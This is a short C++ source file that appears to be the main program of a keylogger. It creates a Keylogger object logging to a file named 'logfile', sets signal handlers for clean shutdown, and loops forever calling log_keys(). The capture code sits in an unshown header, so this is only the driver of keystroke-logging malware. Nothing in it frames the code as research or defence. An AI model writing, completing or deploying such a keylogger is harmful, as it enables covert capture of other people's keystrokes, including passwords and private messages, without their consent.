#include"keylogger.h"
#include<csignal>
#include<stdlib.h>

Keylogger* keylogger = new Keylogger("logfile");
void signalHandler(int signum){
delete keylogger;
exit(0);
}


int main(){

signal(SIGINT, signalHandler);
signal(SIGTERM, signalHandler);

while(true)
	keylogger->log_keys();

return 0;
}
